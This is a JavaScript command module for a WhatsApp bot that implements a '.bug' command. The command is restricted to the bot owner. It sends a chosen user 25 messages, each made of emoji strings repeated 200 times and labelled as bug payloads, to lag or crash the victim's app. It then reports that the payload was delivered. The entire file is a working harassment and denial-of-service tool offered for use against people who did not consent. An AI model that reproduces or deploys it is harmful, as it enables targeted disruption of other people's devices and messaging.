module.exports = async function(sock, chatId, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(chatId, { text: '\u274C Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else return await sock.sendMessage(chatId, { text: '\u26A0\uFE0F .bug @user or reply to user' }, { quoted: msg });
        
        await sock.sendMessage(chatId, { text: `\u1FAB3 Sending bug to @${target.split('@')[0]}...`, mentions: [target] }, { quoted: msg });
        
        // Send bug-inducing messages
        const bugChars = [
            '\uD83D\uDE35', '\uD83D\uDE31', '\uD83E\uDD16', '\uD83D\uDC80',
            '\u2620\uFE0F', '\uD83D\uDC7B', '\uD83D\uDC7A', '\uD83E\uDDDF'
        ];
        
        for (let i = 0; i < 25; i++) {
            try {
                const text = bugChars.join('').repeat(200) + '\nBUG PAYLOAD #' + (i+1);
                await sock.sendMessage(target, { text });
            } catch (e) {}
        }
        
        await sock.sendMessage(chatId, { text: `\u1FAB3 Bug payload delivered!` }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(chatId, { text: '\u274C Error: ' + e.message }, { quoted: msg });
    }
};
